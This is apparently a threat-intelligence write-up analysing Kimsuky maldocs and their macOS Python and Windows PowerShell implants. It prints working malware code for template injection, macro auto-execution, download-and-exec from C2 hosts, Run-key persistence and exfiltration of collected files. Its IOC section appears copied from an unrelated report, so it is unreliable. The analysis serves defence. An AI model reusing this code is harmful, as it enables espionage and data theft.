# apt-get install kimsuky
## Table of Contents
* [Malware analysis](#Malware-analysis)
  + [Python implant](#MacOSX)
  + [Powershell implant](#Windows)
* [Threat Intelligence](#Intel)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [Yara Rules](#Yara)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h3>Python implant<a name="MacOSX"></a></h3>
<h6>The initial vector is a maldoc which used a template injection for download and execute the next stage.</h6>

```xml
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web" TargetMode="External"/>
</Relationships>
```
<h6>This executes a second maldoc with a macro. The first block of the VBA code is the declaration for use the functions of the office version on Mac. <br/>Note : Mac OS X 10.8 comes with Python 2.7 pre-installed by Apple and now Python 3 on the lastest releases.</h6>

```python
#If Mac Then
 #If Win64 Then
  Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As Long
 #Else
  Private Declare Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As Long
 #End If
#End If
```

<h6>The last block of code is the function for auto-executing the malicious code. This request and execute python code in memory (fileless).</h6>

```python
Sub AutoOpen()
On Error GoTo eHandler
 Application.ActiveWindow.View.Type = wdPrintView
 ActiveDocument.Unprotect "1qaz2wsx#EDC"
 Dim s As Shape
 For Each s In ActiveDocument.Shapes
  s.Fill.Solid
  s.Delete
 Next
 Selection.WholeStory
 Selection.Font.Hidden = False
 Selection.Collapse
 ActiveDocument.Save
#If Mac Then
 cmd = "import urllib2;"
 cmd = cmd + "exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v1')).read())"
 Result = popen("python -c """ + cmd + """", "r")
#End If
eHandler: 'if an error is throw exit
 Exit Sub
End Sub
```

<h6>Firstly,this declares the imports, interesting to note that use posixpath package for getting a universal path (with "/") for easily manage theirs paths.</h6>

```python
import os;
import posixpath;
import urllib2;
```
<h6> Once this done, this create the path, enforce to remove the current maldoc and write it again (force but don't check their existence on the disk) for the persistence.</h6>

```python
home_dir = posixpath.expandvars("$HOME");
normal_dotm = home_dir + "/../../../Group Containers/UBF8T346G9.Office/User Content.localized/Templates.localized/normal.dotm"
os.system("rm -f '" + normal_dotm + "'");
fd = os.open(normal_dotm,os.O_CREAT | os.O_RDWR);
data = urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=normal')).read()
os.write(fd, data);
os.close(fd)
```
<h6>Finally, execute the last fileless python script for the recon actions.</h6>

```python
exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read())
```

<h6>The first two functions of the final python script are for executing a new shell and push the program on an infinite loop.</h6>

```python
import os
import posixpath
import time
import urllib2
import threading
from httplib import *
   
def ExecNewCmd():
 exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new')).read())

def SpyLoop():
 while True:
  CollectData()
  ExecNewCmd()
  time.sleep(300)
``` 

<h6>The Collectdata function queries for getting the system informations, files on the differents repertories, pack it on a password ZIP and send it to the C2.</h6>

```python
def CollectData():
 #create work directory
 home_dir = posixpath.expandvars("$HOME")
 workdir = home_dir + "/../../../Group Containers/UBF8T346G9.Office/sync"
 os.system("mkdir -p '" + workdir + "'")

 #get architecture info
 os.system("python -c 'import platform;print(platform.uname())' >> '" + workdir + "/arch.txt'")
 #get systeminfo
 os.system("system_profiler -detailLevel basic >> '" + workdir + "/basic.txt'")
 #get process list
 #os.system("ps -ax >> '" + workdir + "/ps.txt'")
 #get using app list
 os.system("ls -lrS /Applications >> '" + workdir + "/app.txt'")
 #get documents file list
 os.system("ls -lrS '" + home_dir + "/documents' >> '" + workdir + "/documents.txt'")
 #get downloads file list
 os.system("ls -lrS '" + home_dir + "/downloads' >> '" + workdir + "/downloads.txt'")
 #get desktop file list
 os.system("ls -lrS '" + home_dir + "/desktop' >> '" + workdir + "/desktop.txt'")
 #get volumes info
 os.system("ls -lrs /Volumes >> '" + workdir + "/vol.txt'")
 #get logged on user list
 #os.system("w -i >> '" + workdir + "/w_i.txt'")
 #zip gathered informations
 zipname = home_dir + "/../../../Group Containers/UBF8T346G9.Office/backup.zip"
 os.system("rm -f '" + zipname + "'")
 zippass = "doxujoijcs0qei09213@#$@"
 zipcmd = "zip -m -r '" + zipname + "' '" + workdir + "'"
 print(zipcmd)
 os.system(zipcmd)

 try:
  BODY = open(zipname, mode='rb').read()
  headers = {"User-Agent" : "Mozilla/5.0 compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0", "Accept-Language" : "en-US,en;q=0.9", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Content-Type" : "multipart/form-data; boundary=----7e222d1d50232"} ;
  boundary = "----7e222d1d50232";
  postData = "--" + boundary + "\r\nContent-Disposition: form-data; name=""MAX_FILE_SIZE""\r\n\r\n1000000\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=""file""; filename=""1.txt""\r\nContent-Type: text/plain\r\n\r\n" + BODY + "\r\n--" + boundary + "--";
  conn = HTTPConnection("crphone.mireene.com")
  conn.connect()
  conn.request("POST", "/plugin/editor/Templates/upload.php", postData, headers)
  conn.close()

  #delete zipped file
  os.system("rm -f '" + zipname + "'")
 except:
  print "error"
```

<h6>This reuse the code of the structure of the php form for sending teh data of the C2.</h6>

```html
<form enctype="multipart/form-data" action="upload.php?param=" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="10000000" />
 file send: <input name="file" type="file" />
 <input type="submit" value="send" />
</form>
```

<h6>The main code executes a new thread the SpyLoop function.</h6>

```python
main_thread = threading.Thread(target=SpyLoop)
main_thread.start()
```
<h3>Powershell implant<a name="Windows"></a></h3>
<h6>The initial vector is a maldoc with a VBA macro which use an auto-execute function for get the content of theirs forms and execute in memory. The rest of the last three functions are useless.</h6>

```vb
Sub AutoOpen()
 delimage
 interface
 executeps
 shlet
 regpa
End Sub
Sub delimage()
  Selection.Delete Unit:=wdCharacter, Count:=1
End Sub
Function interface()
 TmpEditPath = tptkddlsjangkspdy.Controls(Len("z")).Value
 Set JsEditContent = tptkddlsjangkspdy.Controls(3 - 1 - 1 - 1)
 Open Trim(TmpEditPath) For Output As #2
    Print #2, JsEditContent.Text
 Close #2
End Function
Sub executeps()
d1 = "powershell.exe -ExecutionPolicy Bypass -noLogo $s=[System.IO.File]::ReadAllText('c:\windows\temp\bobo.txt');iex $s"
 With CreateObject("WScript.Shell")
  .Run d1,0, False
 End With
End Sub
```

<h6>We can see the command to download and execute the Powershell script.</h6>

```vb
-------------------------------------------------------------------------------
VBA FORM Variable "TextBox1" IN '.\\vbaProject.bin' - OLE stream: u'tptkddlsjangkspdy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')
-------------------------------------------------------------------------------
VBA FORM Variable "TextBox2" IN '.\\vbaProject.bin' - OLE stream: u'tptkddlsjangkspdy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C:\windows\temp\bobo.txt
```

```vb
Sub shlet()
 Selection.WholeStory
 With Selection.Font
  .NameFarEast = "ÙºæýØÇ Û│áÙöò"
  .NameAscii = ""
  .NameOther = ""
  .Name = ""
  .Hidden = False
 End With
End Sub
Sub regpa()
 With Selection.ParagraphFormat
  .LeftIndent = CentimetersToPoints(2)
  .SpaceBeforeAuto = True
  .SpaceAfterAuto = True
 End With
 With Selection.ParagraphFormat
  .RightIndent = CentimetersToPoints(2)
  .SpaceBeforeAuto = True
  .SpaceAfterAuto = True
 End With
 Selection.PageSetup.TopMargin = CentimetersToPoints(2.5)
 Selection.PageSetup.BottomMargin = CentimetersToPoints(2.5)
End Sub
```
<h6>The first block of the Powershell script is the values used for the configuration (Persistence, URL to join, path of the files, for run payload...).</h6>

```csharp
$SERVER_ADDR = "http://mybobo.mygamesonline.org/flower01/"
$UP_URI = "post.php"
$upName = "flower01"
$LocalID = "flower01"
$LOG_FILENAME = "flower01.hwp"
$LOG_FILEPATH = "\flower01\"
$TIME_VALUE = 3600000
$EXE = "rundll32.exe"
$MyfuncName = "Run"
$RegValueName = "Alzipupdate"
$RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regValue = "cmd.exe /c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')"
```

<h6>The next block is for getting the same informations that the MacOS version and for decode the commands send by the C2 to execute to the victim.</h6>

```csharp
function Get_info($logpath)
{
 Get-ChildItem ([Environment]::GetFolderPath("Recent")) >> $logpath
 dir $env:ProgramFiles >> $logpath
 dir "C:\Program Files (x86)" >> $logpath
 systeminfo >> $logpath
 tasklist >> $logpath
}
function decode($encstr)
{ 
 $key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) 
 $len = $encstr.Length
 $j = 0
 $i = 0
 $comletter = ""
 while($i -lt $len)
 {
  $j = $j % 160  
  $asciidec = $encstr[$i] -bxor $key[$j]
  $dec = [char]$asciidec
  $comletter += $dec
  $j++
  $i++
 }

 return $comletter
}
```

<h6>The next function is for download the next commands as job by the C2.</h6>

```csharp
function Download
{
 $downname = $LocalID + ".down"
 $delphppath = $SERVER_ADDR + "del.php"
 $downpsurl = $SERVER_ADDR + $downname
 $codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
 $comletter = decode $codestring
 $decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
 $RunningJob = Get-Job -State Running
 if($RunningJob.count -lt 3)
 {
  $JobName = $RunningJob.count + 1
  Start-Job -ScriptBlock $decode -Name $JobName
 }
 else
 {
  $JobName = $RunningJob.count
  Stop-Job -Name $RunningJob.Name
  Remove-Job -Name $RunningJob.Name
  Start-Job -ScriptBlock $decode -Name $JobName
 }
 $down_Server_path = $delphppath + "?filename=$LocalID"
 $response = [System.Net.WebRequest]::Create($down_Server_path).GetResponse()
 $response.Close()
}
```

<h6>The last function is for upload the stolen to C2.</h6>

```csharp
function UpLoadFunc($logpath)
{
 $Url = $SERVER_ADDR + $UP_URI
 $bReturn = $True
 $testpath = Test-Path $logpath
 if($testpath -eq $False){return $bReturn}
 $hexdata = [IO.File]::ReadAllText($logpath)
 $encletter = decode $hexdata
 $nEncLen = $encletter.Length
 $LF = "`r`n"
 $templen = 0x100000
 $sum = 0
 do
 {
  $szOptional = ""
  $pUploadData = ""
  Start-Sleep -Milliseconds 100
  $readlen = $templen;
  if (($nEncLen - $sum) -lt $templen){$readlen = $nEncLen - $sum}
  if ($readlen -ne 0)
  {
   $pUploadData = $encletter + $sum
   $sum += $readlen
  }
  else
  {
   $pUploadData += "ending"
   $sum += 9
   $readlen = 6
  }
  Start-Sleep -Milliseconds 1
  $boundary = "----WebKitFormBoundarywhpFxMBe19cSjFnG"
  $ContentType = 'multipart/form-data; boundary=' + $boundary
  $bodyLines = (
  "--$boundary",
  "Content-Disposition: form-data; name=`"MAX_FILE_SIZE`"$LF",
  "10000000",
  "--$boundary",
  "Content-Disposition: form-data; name=`"userfile`"; filename=`"$upName`"",
  "Content-Type: application/octet-stream$LF",
  $pUploadData,
  "--$boundary"
  ) -join $LF

  Start-Sleep -Milliseconds 1
  $psVersion = $PSVersionTable.PSVersion  
  $r = [System.Net.WebRequest]::Create($Url)
  $r.Method = "POST"
  $r.UseDefaultCredentials = $true
  $r.ContentType = $ContentType
  $enc = [system.Text.Encoding]::UTF8
  $data1 = $enc.GetBytes($bodyLines)
  $r.ContentLength = $data1.Length
  $newStream = $r.GetRequestStream()
  $newStream.Write($data1, 0, $data1.Length)
  $newStream.Close();
  
  if($php_post -like "ok"){echo "UpLoad Success!!!"}
  else
  {
   echo "UpLoad Fail!!!"
   $bReturn = $False
  }
 } while ($sum -le $nEncLen);
 return $bReturn
}
```

<h6>The main function pushes the persistence, send the data stolen and wait for the new order.</h6>

```csharp
function main
{
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
 $FilePath = $env:APPDATA + $LOG_FILEPATH
 New-Item -Path $FilePath -Type directory -Force
 $szLogPath = $FilePath + $LOG_FILENAME
 $key = Get-Item -Path $RegKey
 $exists = $key.GetValueNames() -contains $RegValueName
 if($exists -eq $False)
 {
  $value1 = New-ItemProperty -Path $RegKey -Name $RegValueName -Value $regValue
  Get_info $szLogPath
 }
 
 while ($true)
 {
  FileUploading $szLogPath
  Start-Sleep -Milliseconds 10000
  Download
  Start-Sleep -Milliseconds 10000
  Start-Sleep -Milliseconds $TIME_VALUE
 }
}
main
```
   
<h2>Threat Intelligence</h2><a name="Intel"></a></h2>
#### Similarities between the different versions of kimsuky

<h6>Some similarities can be observed :</h6>
<ul>
<li><h6>On the URL path used for download script path like {?filename}=FilenameRquested".</h6></li>
<li><h6>The structure used for upload the data are edited and pushed in the header.</h6></li>
<li><h6>Multiples domains using the same base of the domain mireene.com with recent samples of Kimsuky spotted :</h6></li>

<table>
<tr>
<td>Hash (SHA1)</td>
<td>Filename</td>
<td>Domain</td>
</tr>
<tr>
<td>757a71f0fbd6b3d993be2a213338d1f2</td>
<td>코로나바이러스 대응.doc</td>
<td>vnext.mireene.com</td>
</tr>
<tr>
<td>5f2d3ed67a577526fcbd9a154f522cce</td>
<td>비건 미국무부 부장관 서신 20200302.doc</td>
<td>nhpurumy.mireene.com</td>
</tr>
<tr>
<td>a4388c4d0588cd3d8a607594347663e0</td>
<td>COVID-19 and North Korea.docx</td>
<td>crphone.mireene.com</td>
</tr>
</table>
</ul>

<h6>The domains have the same output IP too and are located in South Korea :</h6>

<table>
<tr>
<td>IP</td>
<td>Route</td>
<td>ASN</td>
<td>Organization</td>
<td>City</td>
<td>Region</td>
<td>Coordinates</td>
<td>Country</td>
</tr>
<tr>
<td>101.79.5.222</td>
<td>101.79.5.0/24</td>
<td>AS38661</td>
<td>purplestones</td>
<td>Kwangmyŏng</td>
<td>Gyeonggi-do</td>
<td>37.4772,126.8664</td>
<td>South Korea</td>
</tr>
</table>

<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain of the maldoc vector.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Kimsuky/2020-03-20/Pictures/Graph_power.PNG">
</p>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>

|Indicator|Description|
| ------------- |:-------------:|
|Special Benefits.docx|6c9c6966ce269bbcab164aca3c3f0231af1f7b26a18e5abc927b2ccdd9499368|
|Criteria of Army Officers.doc|1cb726eab6f36af73e6b0ed97223d8f063f8209d2c25bed39f010b4043b2b8a1|
|7All Selected list.xls|2aa160726037e80384672e89968ab4d2bd3b7f5ca3dfa1b9c1ecc4d1647a63f0|
|ulhtagnias.exe|d2c46e066ff7802cecfcb7cf3bab16e63827c326b051dc61452b896a673a6e67|
|198.46.177.73|IP C2|

<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/json/ioc.json">JSON</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Scripting<br>PowerShell|https://attack.mitre.org/techniques/T1064/<br>https://attack.mitre.org/techniques/T1086/|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Discovery|Query Registry<br>Process Discovery<br>System Information Discovery|https://attack.mitre.org/techniques/T1012/<br>https://attack.mitre.org/techniques/T1057/<br>https://attack.mitre.org/techniques/T1082/|


<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Kimsuky/2020-03-20/JSON/Mitre-Kimsuky-2020-03-20.json">Export in JSON</a></h6>
<h2>Yara Rules<a name="Yara"></a></h2>
<h6> A list of YARA Rule is available <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Kimsuky/2020-03-20/Rules/Yara_Rule_Kimsuky_2020_03_20.yar">here</a></h6>
<h2>Links <a name="Links"></a></h2>
<h6> Original tweets: </h6><a name="tweet"></a>

* [https://twitter.com/Timele9527/status/1240620534468997125](https://twitter.com/Timele9527/status/1240620534468997125) 
* [https://twitter.com/Timele9527/status/1240123132419223554](https://twitter.com/Timele9527/status/1240123132419223554) 
* [https://twitter.com/cyberwar_15/status/1240779000256942080](https://twitter.com/cyberwar_15/status/1240779000256942080) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [붙임. 전문가 칼럼 원고 작성 양식.doc](https://app.any.run/tasks/88f1b03b-67d2-49a9-8f21-7e990d802342)
* [COVID-19 and North Korea.docx](https://app.any.run/tasks/1d2135b2-b7a3-4c31-a0ee-ab5742194068)
